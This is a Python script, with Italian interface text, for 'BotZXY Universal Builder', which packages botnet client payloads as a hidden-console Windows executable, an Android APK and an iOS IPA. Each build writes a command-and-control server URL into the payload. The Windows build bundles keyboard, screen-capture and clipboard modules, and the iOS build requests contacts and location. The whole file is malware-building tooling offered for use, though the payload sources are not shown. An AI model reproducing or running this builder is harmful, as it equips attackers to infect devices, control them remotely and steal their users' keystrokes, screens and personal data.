#!/usr/bin/env python3
# BotZXY Universal Builder v2.0
# Supporta: Windows (.exe), Android (.apk), iOS (.ipa)

import os
import sys
import platform
import subprocess
import shutil
import json
import time
import requests
import hashlib

# ============ CONFIGURAZIONE ============
VERSION = "2.0"
C2_SERVER = "https://botzxy-c2.onrender.com"
BUILDER_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOADS_DIR = os.path.join(BUILDER_DIR, "payloads")
DIST_DIR = os.path.join(BUILDER_DIR, "dist")

# ============ COLORI ============
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Colors.PURPLE}{Colors.BOLD}╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║     ██████╗  ██████╗ ████████╗███████╗██╗  ██╗██╗   ██╗
║     ██╔══██╗██╔═══██╗╚══██╔══╝╚══███╔╝╚██╗██╔╝╚██╗ ██╔╝
║     ██████╔╝██║   ██║   ██║     ███╔╝  ╚███╔╝  ╚████╔╝ 
║     ██╔══██╗██║   ██║   ██║    ███╔╝   ██╔██╗   ╚██╔╝  
║     ██████╔╝╚██████╔╝   ██║   ███████╗██╔╝ ██╗   ██║   
║     ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝   
║                                                           ║
║              {Colors.YELLOW}UNIVERSAL BUILDER v{VERSION}{Colors.END}{Colors.PURPLE}
║                                                           ║
╚═══════════════════════════════════════════════════════════╝{Colors.END}
    """)

def print_section(title):
    print(f"\n{Colors.CYAN}{Colors.BOLD}┌─ {title} ─────────────────────────────────────────────┐{Colors.END}")

def print_success(msg):
    print(f"{Colors.GREEN}✔ {msg}{Colors.END}")

def print_error(msg):
    print(f"{Colors.RED}✖ {msg}{Colors.END}")

def print_info(msg):
    print(f"{Colors.BLUE}ℹ {msg}{Colors.END}")

def print_warning(msg):
    print(f"{Colors.YELLOW}⚠ {msg}{Colors.END}")

def print_step(step, msg):
    print(f"{Colors.PURPLE}[{step}]{Colors.END} {msg}")

# ============ CHECK DEPENDENZE ============
def check_dependencies():
    print_section("VERIFICA DEPENDENZE")
    deps = {}
    all_ok = True
    
    print_step("1/6", "Verifica Python...")
    deps['python'] = {'installed': True, 'version': platform.python_version()}
    print_success(f"Python {platform.python_version()}")

    print_step("2/6", "Verifica pip...")
    try:
        pip_version = subprocess.check_output(['pip', '--version'], text=True).split()[1]
        deps['pip'] = {'installed': True, 'version': pip_version}
        print_success(f"pip {pip_version}")
    except:
        deps['pip'] = {'installed': False}
        print_error("pip non trovato")
        all_ok = False

    print_step("3/6", "Verifica pacchetti Python...")
    required_packages = ['requests', 'pyinstaller', 'pillow', 'opencv-python', 'pyautogui']
    missing = []
    for pkg in required_packages:
        try:
            __import__(pkg.replace('-', '_'))
            print_success(f"{pkg} OK")
        except ImportError:
            missing.append(pkg)
            print_error(f"{pkg} MANCANTE")
            all_ok = False
    
    if missing:
        print_warning(f"Pacchetti mancanti: {', '.join(missing)}")
        print_info(f"Installa con: pip install {' '.join(missing)}")

    print_step("4/6", "Verifica buildozer (Android)...")
    try:
        subprocess.check_output(['buildozer', '--version'], stderr=subprocess.DEVNULL)
        deps['buildozer'] = {'installed': True}
        print_success("buildozer OK")
    except:
        deps['buildozer'] = {'installed': False}
        print_warning("buildozer non trovato (necessario per APK)")
        print_info("Installa con: pip install buildozer")

    print_step("5/6", "Verifica Xcode (iOS)...")
    if platform.system() == 'Darwin':
        try:
            subprocess.check_output(['xcodebuild', '-version'], stderr=subprocess.DEVNULL)
            deps['xcode'] = {'installed': True}
            print_success("Xcode OK")
        except:
            deps['xcode'] = {'installed': False}
            print_warning("Xcode non trovato (necessario per IPA)")
            print_info("Installa Xcode dall'App Store")
    else:
        print_info("Xcode non richiesto (solo per iOS su macOS)")

    print_step("6/6", "Verifica PyInstaller (Windows)...")
    try:
        subprocess.check_output(['pyinstaller', '--version'], stderr=subprocess.DEVNULL)
        deps['pyinstaller'] = {'installed': True}
        print_success("PyInstaller OK")
    except:
        deps['pyinstaller'] = {'installed': False}
        print_warning("PyInstaller non trovato (necessario per EXE)")
        print_info("Installa con: pip install pyinstaller")

    return deps, all_ok

# ============ INSTALLAZIONE DEPENDENZE ============
def install_dependencies():
    print_section("INSTALLAZIONE DEPENDENZE")
    print_info("Installazione pacchetti Python...")
    subprocess.run([
        sys.executable, '-m', 'pip', 'install',
        'requests', 'pyinstaller', 'pillow', 'opencv-python', 'pyautogui',
        'keyboard', 'pywin32', 'numpy'
    ])
    print_info("Installazione buildozer (Android)...")
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'buildozer'])
    print_success("Tutte le dipendenze installate!")
    input(f"\n{Colors.GREEN}Premi INVIO per continuare...{Colors.END}")

# ============ BUILD WINDOWS EXE ============
def build_windows(c2_url):
    print_section("BUILD WINDOWS (.exe)")
    client_path = os.path.join(PAYLOADS_DIR, 'windows_client.py')
    if not os.path.exists(client_path):
        print_error(f"File payload non trovato: {client_path}")
        return False
    
    with open(client_path, 'r') as f:
        content = f.read()
    content = content.replace('C2_URL = "https://botzxy-c2.onrender.com"', f'C2_URL = "{c2_url}"')
    
    temp_path = os.path.join(BUILDER_DIR, 'windows_client_temp.py')
    with open(temp_path, 'w') as f:
        f.write(content)
    
    print_info("Compilazione in corso...")
    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile',
        '--noconsole',
        '--name', 'botzxy_client',
        '--hidden-import', 'keyboard',
        '--hidden-import', 'pyautogui',
        '--hidden-import', 'win32clipboard',
        temp_path
    ]
    
    result = subprocess.run(cmd, capture_output=True)
    
    if result.returncode == 0:
        exe_path = os.path.join(BUILDER_DIR, 'dist', 'botzxy_client.exe')
        if os.path.exists(exe_path):
            print_success(f"EXE creato: {exe_path}")
            size = os.path.getsize(exe_path) / (1024 * 1024)
            print_info(f"Dimensione: {size:.2f} MB")
            return True
        else:
            print_error("EXE non trovato dopo la compilazione")
            return False
    else:
        print_error(f"Errore compilazione: {result.stderr.decode()}")
        return False

# ============ BUILD ANDROID APK ============
def build_android(c2_url):
    print_section("BUILD ANDROID (.apk)")
    apk_dir = os.path.join(BUILDER_DIR, 'apk_build')
    os.makedirs(apk_dir, exist_ok=True)
    
    client_path = os.path.join(PAYLOADS_DIR, 'android_client.py')
    if not os.path.exists(client_path):
        print_error(f"File payload non trovato: {client_path}")
        return False
    
    with open(client_path, 'r') as f:
        content = f.read()
    content = content.replace('C2_URL = "https://botzxy-c2.onrender.com"', f'C2_URL = "{c2_url}"')
    
    main_path = os.path.join(apk_dir, 'main.py')
    with open(main_path, 'w') as f:
        f.write(content)
    with open(os.path.join(apk_dir, '__init__.py'), 'w') as f:
        f.write('')
    
    spec_content = f'''
[app]
title = BotZXY
package.name = botzxy
package.domain = org.botzxy
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf
version = 2.0
requirements = python3,kivy,requests,opencv-python,termux-api,android
orientation = portrait
osx.python_version = 3
osx.kivy_version = 2.1.0
fullscreen = 0

[buildozer]
log_level = 2
warn_on_root = 1
'''
    
    spec_path = os.path.join(apk_dir, 'buildozer.spec')
    with open(spec_path, 'w') as f:
        f.write(spec_content)
    os.makedirs(os.path.join(apk_dir, 'bin'), exist_ok=True)
    
    print_info("Compilazione APK in corso... (richiede diversi minuti)")
    result = subprocess.run(['buildozer', 'android', 'debug', 'deploy', 'run'], cwd=apk_dir, capture_output=True)
    
    if result.returncode == 0:
        import glob
        apk_files = glob.glob(os.path.join(apk_dir, 'bin', '*.apk'))
        if apk_files:
            os.makedirs(DIST_DIR, exist_ok=True)
            for apk in apk_files:
                dest = os.path.join(DIST_DIR, os.path.basename(apk))
                shutil.copy2(apk, dest)
                print_success(f"APK creato: {dest}")
                size = os.path.getsize(dest) / (1024 * 1024)
                print_info(f"Dimensione: {size:.2f} MB")
            return True
        else:
            print_error("APK non trovato dopo la compilazione")
            return False
    else:
        print_error(f"Errore compilazione APK: {result.stderr.decode()}")
        return False

# ============ BUILD iOS IPA ============
def build_ios(c2_url):
    print_section("BUILD iOS (.ipa)")
    if platform.system() != 'Darwin':
        print_error("La compilazione per iOS richiede macOS con Xcode")
        print_info("Su altri sistemi, usa il file .py su Pythonista o Pyto")
        return False
    
    ipa_dir = os.path.join(BUILDER_DIR, 'ipa_build')
    os.makedirs(ipa_dir, exist_ok=True)
    
    plist_content = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleName</key>
    <string>BotZXY</string>
    <key>CFBundleIdentifier</key>
    <string>com.botzxy.c2</string>
    <key>CFBundleVersion</key>
    <string>2.0</string>
    <key>CFBundleShortVersionString</key>
    <string>2.0</string>
    <key>LSRequiresIPhoneOS</key>
    <true/>
    <key>UISupportedInterfaceOrientations</key>
    <array>
        <string>UIInterfaceOrientationPortrait</string>
    </array>
    <key>NSContactsUsageDescription</key>
    <string>BotZXY needs access to contacts</string>
    <key>NSLocationWhenInUseUsageDescription</key>
    <string>BotZXY needs access to location</string>
</dict>
</plist>
'''
    
    os.makedirs(os.path.join(ipa_dir, 'Payload', 'BotZXY.app'), exist_ok=True)
    with open(os.path.join(ipa_dir, 'Payload', 'BotZXY.app', 'Info.plist'), 'w') as f:
        f.write(plist_content)
    
    client_path = os.path.join(PAYLOADS_DIR, 'ios_client.py')
    if not os.path.exists(client_path):
        print_error(f"File payload non trovato: {client_path}")
        return False
    
    with open(client_path, 'r') as f:
        content = f.read()
    content = content.replace('C2_URL = "https://botzxy-c2.onrender.com"', f'C2_URL = "{c2_url}"')
    
    with open(os.path.join(ipa_dir, 'Payload', 'BotZXY.app', 'main.py'), 'w') as f:
        f.write(content)
    
    print_info("Creazione IPA in corso...")
    import zipfile
    ipa_path = os.path.join(DIST_DIR, 'BotZXY.ipa')
    os.makedirs(DIST_DIR, exist_ok=True)
    
    with zipfile.ZipFile(ipa_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(os.path.join(ipa_dir, 'Payload')):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, ipa_dir)
                zipf.write(file_path, arcname)
    
    if os.path.exists(ipa_path):
        print_success(f"IPA creato: {ipa_path}")
        size = os.path.getsize(ipa_path) / (1024 * 1024)
        print_info(f"Dimensione: {size:.2f} MB")
        return True
    else:
        print_error("IPA non creato")
        return False

# ============ MENU PRINCIPALE ============
def main_menu():
    print_header()
    
    print(f"""
{Colors.WHITE}┌─────────────────────────────────────────────────────────┐
│  {Colors.CYAN}1{Colors.WHITE} - {Colors.GREEN}Windows (.exe){Colors.WHITE}                    │
│  {Colors.CYAN}2{Colors.WHITE} - {Colors.YELLOW}Android (.apk){Colors.WHITE}                   │
│  {Colors.CYAN}3{Colors.WHITE} - {Colors.BLUE}iOS (.ipa){Colors.WHITE}                       │
│  {Colors.CYAN}4{Colors.WHITE} - {Colors.PURPLE}Installa dipendenze{Colors.WHITE}             │
│  {Colors.CYAN}5{Colors.WHITE} - {Colors.RED}Esci{Colors.WHITE}                              │
└─────────────────────────────────────────────────────────┘
    """)
    
    choice = input(f"{Colors.CYAN}Scelta {Colors.WHITE}(1-5): {Colors.END}").strip()
    return choice

# ============ MAIN ============
def main():
    while True:
        choice = main_menu()
        
        if choice == '5' or choice.lower() == 'exit':
            print(f"{Colors.GREEN}Arrivederci!{Colors.END}")
            break
        
        if choice == '4':
            install_dependencies()
            continue
        
        if choice not in ['1', '2', '3']:
            print_error("Scelta non valida")
            time.sleep(1)
            continue
        
        deps, all_ok = check_dependencies()
        
        if choice == '1' and not deps.get('pyinstaller', {}).get('installed', False):
            print_warning("PyInstaller non installato!")
            install = input(f"{Colors.YELLOW}Vuoi installarlo? (s/n): {Colors.END}").strip().lower()
            if install == 's':
                subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])
            else:
                continue
        
        if choice == '2' and not deps.get('buildozer', {}).get('installed', False):
            print_warning("buildozer non installato!")
            install = input(f"{Colors.YELLOW}Vuoi installarlo? (s/n): {Colors.END}").strip().lower()
            if install == 's':
                subprocess.run([sys.executable, '-m', 'pip', 'install', 'buildozer'])
            else:
                continue
        
        print(f"\n{Colors.CYAN}Server C2 attuale: {C2_SERVER}{Colors.END}")
        change = input(f"{Colors.YELLOW}Cambiare URL? (s/n): {Colors.END}").strip().lower()
        if change == 's':
            c2_url = input(f"{Colors.WHITE}Inserisci URL del server C2: {Colors.END}").strip()
            if not c2_url:
                c2_url = C2_SERVER
        else:
            c2_url = C2_SERVER
        
        if choice == '1':
            build_windows(c2_url)
        elif choice == '2':
            build_android(c2_url)
        elif choice == '3':
            build_ios(c2_url)
        
        print(f"\n{Colors.GREEN}Build completata!{Colors.END}")
        input(f"\n{Colors.WHITE}Premi INVIO per continuare...{Colors.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}Arrivederci!{Colors.END}")
        sys.exit(0)